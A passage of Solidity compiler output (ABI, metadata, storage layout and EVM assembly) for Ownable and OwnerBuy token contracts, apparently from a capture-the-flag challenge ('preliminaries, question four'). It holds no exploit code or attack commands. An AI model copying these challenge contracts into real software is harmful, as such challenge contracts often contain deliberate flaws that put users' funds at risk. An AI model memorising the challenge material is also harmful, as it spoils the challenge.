56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				},
				"Ownable": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "previousOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnershipTransferred",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "_owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "_previousOwner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "lock",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "renounceOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "transferOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "unlock",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"constructor": {
								"details": "Initializes the contract setting the deployer as the initial owner."
							},
							"owner()": {
								"details": "Returns the address of the current owner."
							},
							"renounceOwnership()": {
								"details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner.      * NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
							},
							"transferOwnership(address)": {
								"details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
							}
						}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"_owner()": "b2bdfa7b",
							"_previousOwner()": "6e63cd96",
							"lock()": "f83d08ba",
							"owner()": "8da5cb5b",
							"renounceOwnership()": "715018a6",
							"transferOwnership(address)": "f2fde38b",
							"unlock()": "a69df4b5"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_previousOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"lock\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unlock\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"constructor\":{\"details\":\"Initializes the contract setting the deployer as the initial owner.\"},\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner.      * NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":\"Ownable\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":{\"keccak256\":\"0x6c5b72099bc5f9740cbeb28650f50b1291a1eca5fbdbf6611673c9c8bcf2ba41\",\"urls\":[\"bzz-raw://f123693ee63491f5f4e4f8a62829af806c8814e5bdaaf6ce34ce08dbf396c33d\",\"dweb:/ipfs/QmPoszddSPRrmMRMFwfT9cXvCZmLbSEobQwqV2p1qEvd99\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 14,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:Ownable",
								"label": "_owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 16,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:Ownable",
								"label": "_previousOwner",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"OwnerBuy": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "previousOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnershipTransferred",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"name": "finished",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "Times",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "_owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "_previousOwner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "buy",
							"outputs": [
								{
									"internalType": "bool",
									"name": "success",
									"type": "bool"
								}
							],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "changeOwner",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "changestatus",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "subtractedValue",
									"type": "uint256"
								}
							],
							"name": "decreaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "finish",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "addedValue",
									"type": "uint256"
								}
							],
							"name": "increaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "addr",
									"type": "address"
								}
							],
							"name": "isWhite",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "lock",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "renounceOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_amount",
									"type": "uint256"
								}
							],
							"name": "sell",
							"outputs": [
								{
									"internalType": "bool",
									"name": "success",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "addr",
									"type": "address"
								}
							],
							"name": "setWhite",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "status",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "transferOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "unlock",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "addr",
									"type": "address"
								}
							],
							"name": "unsetWhite",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"allowance(address,address)": {
								"details": "See {IERC20-allowance}."
							},
							"approve(address,uint256)": {
								"details": "See {IERC20-approve}.      * Requirements:      * - `spender` cannot be the zero address."
							},
							"balanceOf(address)": {
								"details": "See {IERC20-balanceOf}."
							},
							"decimals()": {
								"details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).      * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei.      * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
							},
							"decreaseAllowance(address,uint256)": {
								"details": "Atomically decreases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
							},
							"increaseAllowance(address,uint256)": {
								"details": "Atomically increases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address."
							},
							"name()": {
								"details": "Returns the name of the token."
							},
							"owner()": {
								"details": "Returns the address of the current owner."
							},
							"renounceOwnership()": {
								"details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner.      * NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
							},
							"symbol()": {
								"details": "Returns the symbol of the token, usually a shorter version of the name."
							},
							"totalSupply()": {
								"details": "See {IERC20-totalSupply}."
							},
							"transfer(address,uint256)": {
								"details": "See {IERC20-transfer}.      * Requirements:      * - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
							},
							"transferFrom(address,address,uint256)": {
								"details": "See {IERC20-transferFrom}.      * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};      * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `value`. - the caller must have allowance for `sender`'s tokens of at least `amount`."
							},
							"transferOwnership(address)": {
								"details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
							}
						}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2509:5232  contract OwnerBuy is Ownable, ERC20, ERC20Detailed {\r... */\n  mstore(0x40, 0x80)\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2727:2730  100 */\n  0x64\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2709:2730  uint256 MAXHOLD = 100 */\n  0x0b\n  sstore\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2766:2823  constructor() public ERC20Detailed(\"DEMO\", \"DEMO\", 18) {} */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2766:2823  constructor() public ERC20Detailed(\"DEMO\", \"DEMO\", 18) {} */\n  pop\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":433:600  constructor (string memory name, string memory symbol, uint8 decimals) public {\r... */\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x04\n  dup2\n  mstore\n  0x20\n  add\n  0x44454d4f00000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x04\n  dup2\n  mstore\n  0x20\n  add\n  0x44454d4f00000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2817:2819  18 */\n  0x12\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":599:616  address msgSender */\n  0x00\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":619:629  msg.sender */\n  caller\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":599:629  address msgSender = msg.sender */\n  swap1\n  pop\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":649:658  msgSender */\n  dup1\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":640:646  _owner */\n  0x00\n  dup1\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":640:658  _owner = msgSender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":707:716  msgSender */\n  dup1\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":674:717  OwnershipTransferred(address(0), msgSender) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":703:704  0 */\n  0x00\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":674:717  OwnershipTransferred(address(0), msgSender) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n  mload(0x40)\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":565:725  constructor() internal {\r... */\n  pop\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":530:534  name */\n  dup3\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":522:527  _name */\n  0x05\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":522:534  _name = name */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_7\n  swap3\n  swap2\n  swap1\n  tag_8\n  jump\t// in\ntag_7:\n  pop\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":555:561  symbol */\n  dup2\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":545:552  _symbol */\n  0x06\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":545:561  _symbol = symbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_9\n  swap3\n  swap2\n  swap1\n  tag_8\n  jump\t// in\ntag_9:\n  pop\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":584:592  decimals */\n  dup1\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":572:581  _decimals */\n  0x07\n  0x00\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":572:592  _decimals = decimals */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":433:600  constructor (string memory name, string memory symbol, uint8 decimals) public {\r... */\n  pop\n  pop\n  pop\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":2509:5232  contract OwnerBuy is Ownable, ERC20, ERC20Detailed {\r... */\n  jump(tag_11)\ntag_8:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_13\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_12)\ntag_13:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_12\n  jumpi\n  swap2\n  dup3\n  add\ntag_14:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_15\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_14)\ntag_15:\ntag_12:\n  pop\n  swap1\n  pop\n  tag_16\n  swap2\n  swap1\n  tag_17\n  jump\t// in\ntag_16:\n  pop\n  swap1\n  jump\t// out\ntag_17:\n  tag_18\n  swap2\n  swap1\ntag_19:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_20\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_19)\ntag_20:\n  pop\n  swap1\n  jump\ntag_18:\n  swap1\n  jump\t// out\ntag_11:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2509:5232  contract OwnerBuy is Ownable, ERC20, ERC20Detailed {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      gt\n      tag_30\n      jumpi\n      dup1\n      0xb2bdfa7b\n      gt\n      tag_31\n      jumpi\n      dup1\n      0xdd62ed3e\n      gt\n      tag_32\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_26\n      jumpi\n      dup1\n      0xe4849b32\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xf2fde38b\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xf83d08ba\n      eq\n      tag_29\n      jumpi\n      jump(tag_1)\n    tag_32:\n      dup1\n      0xb2bdfa7b\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xc03646ba\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xd56b2889\n      eq\n      tag_25\n      jumpi\n      jump(tag_1)\n    tag_31:\n      dup1\n      0xa457c2d7\n      gt\n      tag_33\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_19\n      jumpi\n      dup1\n      0xa69df4b5\n      eq\n      tag_20\n      jumpi\n      dup1\n      0xa6f2ae3a\n      eq\n      tag_21\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_22\n      jumpi\n      jump(tag_1)\n    tag_33:\n      dup1\n      0x8da5cb5b\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_17\n      jumpi\n      dup1\n      0xa348c289\n      eq\n      tag_18\n      jumpi\n      jump(tag_1)\n    tag_30:\n      dup1\n      0x41702014\n      gt\n      tag_34\n      jumpi\n      dup1\n      0x645b8b1b\n      gt\n      tag_35\n      jumpi\n      dup1\n      0x645b8b1b\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x6e63cd96\n      eq\n      tag_13\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x715018a6\n      eq\n      tag_15\n      jumpi\n      jump(tag_1)\n    tag_35:\n      dup1\n      0x41702014\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x51ec819f\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x62a09477\n      eq\n      tag_11\n      jumpi\n      jump(tag_1)\n    tag_34:\n      dup1\n      0x1c87e971\n      gt\n      tag_36\n      jumpi\n      dup1\n      0x1c87e971\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_8\n      jumpi\n      jump(tag_1)\n    tag_36:\n      dup1\n      0x06fdde03\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":670:753  function name() public view returns (string memory) {\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_37\n      jumpi\n        /* 